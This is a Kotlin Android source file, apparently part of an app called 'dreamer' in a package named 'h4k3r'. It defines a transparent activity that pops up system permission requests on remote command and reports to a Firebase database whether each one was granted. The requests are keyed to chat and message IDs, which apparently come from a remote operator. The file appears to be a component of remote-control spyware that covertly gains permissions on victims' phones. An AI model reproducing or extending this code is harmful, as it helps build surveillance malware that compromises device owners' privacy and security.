package com.h4k3r.dreamer

import android.os.Bundle
import androidx.activity.ComponentActivity
import androidx.activity.result.contract.ActivityResultContracts
import com.google.firebase.database.ktx.database
import com.google.firebase.ktx.Firebase

class PermissionRequestActivity : ComponentActivity() {
    private val permissionLauncher = registerForActivityResult(
        ActivityResultContracts.RequestPermission()
    ) { isGranted ->
        // Send result back to service
        val chatId = intent.getLongExtra("chat_id", 0L)
        val msgId = intent.getLongExtra("msg_id", 0L)

        if (chatId != 0L && msgId != 0L) {
            // Update Firebase with result
            val prefs = getSharedPreferences("dreamer_auth", MODE_PRIVATE)
            val secretKey = prefs.getString("secret_key", "") ?: ""
            val deviceId = prefs.getString("device_id", "") ?: ""

            if (secretKey.isNotEmpty() && deviceId.isNotEmpty()) {
                Firebase.database.reference
                    .child("devices")
                    .child(secretKey)
                    .child(deviceId)
                    .child("permission_result")
                    .setValue(mapOf(
                        "granted" to isGranted,
                        "chat_id" to chatId,
                        "msg_id" to msgId,
                        "timestamp" to System.currentTimeMillis()
                    ))
            }
        }

        finish()
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        // Remove setContentView to allow system permission dialog to take focus
        // The transparent theme will handle the background

        val permission = intent.getStringExtra("permission")
        if (permission != null) {
            permissionLauncher.launch(permission)
        } else {
            finish()
        }
    }
}